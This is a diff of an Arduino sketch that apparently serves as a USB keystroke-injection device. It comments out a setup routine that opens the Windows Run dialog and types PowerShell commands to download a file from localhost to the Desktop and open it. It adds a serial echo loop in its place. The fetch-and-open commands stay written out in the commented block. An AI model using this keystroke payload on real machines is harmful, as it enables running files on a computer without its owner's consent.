@@ -1,3 +1,5 @@
+String serialMessage;
+
 #include <Keyboard.h>
 
 #define KEY_LEFT_CTRL 0x80
@@ -39,8 +41,9 @@
 void setup() {
   Keyboard.begin();
   
-  delay(500);
-  Keyboard.press(KEY_LEFT_GUI);
+  //delay(500);
+  Serial.begin(9600);
+  /*Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();  
   delay(100);
@@ -48,13 +51,20 @@ void setup() {
   delay(100);
   Keyboard.println("*New/Object System.Net.WebClient(.DownloadFile*@http>&&localhost&CodePNG.png@, @$*$Env>userprofile(&Desktop&CodePNG.png@(");
   Keyboard.println("Invoke/item $Env>userprofile&Desktop&CodePNG.png");
-  /*Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
-  Keyboard.println("Invoke-item $Env:userprofile/Desktop/CodePNG.png"); */
+  Keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/CodePNG.png\", \"$($Env:userprofile)/Desktop/CodePNG.png\")");
+  Keyboard.println("Invoke-item $Env:userprofile/Desktop/CodePNG.png");
   Keyboard.releaseAll();
   
-  Keyboard.end();
+  Keyboard.end();*/
 }
 
 void loop() {
-
+  serialMessage = Serial.readString();
+  delay(100);
+  Serial.println(serialMessage);
+  if(serialMessage == 'sale'){
+    Serial.println(serialMessage);
+    Serial.println(serialMessage);
+    Serial.println(serialMessage);
+  }
 }
